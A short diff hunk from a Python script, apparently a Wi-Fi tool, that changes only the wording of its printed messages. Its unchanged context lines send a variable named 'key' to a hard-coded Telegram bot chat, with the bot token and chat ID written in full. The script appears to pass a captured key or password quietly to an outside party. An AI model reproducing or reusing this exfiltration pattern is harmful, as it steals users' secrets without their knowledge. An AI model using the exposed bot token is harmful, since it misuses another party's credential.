@@ -104,8 +104,8 @@ else:
             url = ("https://api.telegram.org/bot7171379416:AAEbyJBW2_uzfrnHgw2eQg1QB_3EN3SFzGA/sendMessage?chat_id=1818902368&text={}".format(key))
             req = requests.post(url, data={"chat_id": 1818902368, "text": key})
             if req.status_code == 200:
-                print("OK Plase Wait...")
+                print("OK please Wait...")
             else:
-                print("Thans ^_~ ", req.status_code, req.text)
-
+                print("Error: ", req.status_code, req.text)
+            print("Thans ^_~ ")
     MyWifi()
